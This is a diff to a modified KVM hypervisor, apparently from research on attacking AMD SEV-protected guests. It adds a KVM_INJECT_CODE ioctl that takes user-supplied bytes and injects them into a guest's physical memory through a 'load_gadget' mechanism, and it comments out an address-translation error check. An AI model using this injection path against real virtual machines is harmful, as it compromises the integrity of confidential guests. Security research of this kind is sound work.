@@ -119,6 +119,7 @@ EXPORT_SYMBOL(severed_stop_time);
 DEFINE_SPINLOCK(severed_action_lock);
 EXPORT_SYMBOL(severed_action_lock);
 
+extern load_gadget_t load_gadget; // defined in /arch/x86/kvm/cpuid.h
 struct kvm *main_vm;
 extern spinlock_t kaslr_fault_counter_lock;
 extern int kaslr_fault_counter;
@@ -1769,7 +1770,7 @@ static int __kvm_read_guest_page(struct kvm_memory_slot *slot, gfn_t gfn,
   return 0;
 }
 
-// Luca: adapted from the kvmi pathces
+// Luca: taken from the kvmi pathces
 static long get_user_pages_remote_unlocked(struct mm_struct *mm,
                                            unsigned long start,
                                            unsigned long nr_pages,
@@ -1866,6 +1867,16 @@ int read_physical(struct kvm *kvm, u64 gpa, void *buff, u64 size,
 
   hva = gfn_to_hva(kvm, gpa_to_gfn(gpa));
 
+  // TODO: test change
+  /*
+  if (kvm_is_error_hva(hva)) {
+    printk(KERN_CRIT "Luca: read_physical: translation to hva failed( gpa was "
+                     "%016llx hva is %016lx\n",
+           gpa, hva);
+    ec = -100;
+    goto out;
+  }
+  */
 
   if (get_user_pages_remote_unlocked(kvm->mm, hva, 1, 0, &page) != 1) {
     printk(KERN_CRIT "Luca: read_physical: failed to get page struct from mm");
@@ -3868,6 +3879,91 @@ static long kvm_dev_ioctl(struct file *filp, unsigned int ioctl,
     vfree(new_data_buffer);
     r = 0; // indicate success
     break;
+
+  case KVM_INJECT_CODE: {
+#define KVM_INJECT_CODE_DEBUG
+    inject_param_t inject_param;
+    uint8_t *code;
+
+    printk(KERN_NOTICE "KVM_INJECT_CODE got called\n");
+    argp = (void __user *)arg; // not sure what this is for
+    // copy parameters from user space
+    if (copy_from_user(&inject_param, argp, sizeof(inject_param_t))) {
+      printk(KERN_CRIT "KVM_INJECT_CODE: error copying "
+                       "arguments, exiting\n");
+      return -EFAULT;
+    }
+#ifdef KVM_INJECT_CODE_DEBUG
+    printk(KERN_NOTICE
+           "KVM_INJECT_CODE copied user space params with "
+           "gpa = %016llx\t insert_at_back = %d , length = %llu\n"
+           "and injection_code_buffer pointer = %p and target_value = %d\n",
+           inject_param.gpa, inject_param.insert_at_back, inject_param.length,
+           inject_param.injection_code_buffer, inject_param.target_value);
+#endif
+    // copy array supplied in inject_param
+    code = kmalloc(inject_param.length, GFP_KERNEL);
+    printk("kmalloc sucessfull\n");
+    res = copy_from_user(code, (void *)inject_param.injection_code_buffer,
+                         inject_param.length);
+    if (res != 0) {
+      printk(KERN_CRIT
+             "Luca: KVM_INJECT_CODE: failed to copy from userpace, exiting\n");
+      return r;
+    }
+
+#ifdef KVM_INJECT_CODE_DEBUG
+    printk("Inject at gpa = %llx with insert_at_back = %d. Plain injection "
+           "code is: %02x %02x",
+           inject_param.gpa, inject_param.insert_at_back, code[0], code[1]);
+#endif
+
+    // load gadget
+    load_gadget.target_value = inject_param.target_value;
+    load_gadget.prev_prev_eax = inject_param.prev_prev_eax;
+    load_gadget.prev_eax = inject_param.prev_eax;
+    load_gadget.repetition_counter = 0;
+    load_gadget.type = inject_param.type;
+    load_gadget.last_gpa = inject_param.gpa;
+    load_gadget.curr_bit = 31;
+    load_gadget.round = 0;
+    load_gadget.text_page = NULL;
+    load_gadget.text_mapping = NULL;
+    load_gadget.stack_page = NULL;
+    load_gadget.stack_mapping = NULL;
+
+    // reset_lookup_cache();
+
+    printk(
+        "Initialized load_gadget with: target_value = %016llx, prev_prev_eax = "
+        "%x, prev_eax = %x, type = %d\n",
+        load_gadget.target_value, load_gadget.prev_prev_eax,
+        load_gadget.prev_eax, load_gadget.type);
+
+// TODO: debug flag
+//#define INJECT_NOSEV
+#ifndef INJECT_NOSEV
+	 //defined in arch/x86/kvm/mmu.c
+    if (inject_code(main_vm, inject_param.gpa, code, inject_param.length,
+                    inject_param.insert_at_back)) {
+      printk(KERN_NOTICE "KVM_INJECT_CODE: code injection successfull!\n");
+    } else {
+      printk(KERN_NOTICE "KVM_INJECT_CODE: code injection failed :(\n");
+    }
+#else
+    int res = write_physical(main_vm, inject_param.gpa, inject_param.length,
+                             code, true);
+    if (res == 0) {
+      printk(KERN_NOTICE
+             "KVM_NOSEV_INEJCT_CODE: code injection successfull!\n");
+    } else {
+      printk(KERN_NOTICE "KVM_NOSEV_INJECT_CODE: code inejction failed\n");
+    }
+#endif
+
+    kfree(code);
+    r = 0; // indicate sucess
+  } break;
 
   default:
     return kvm_arch_dev_ioctl(filp, ioctl, arg);
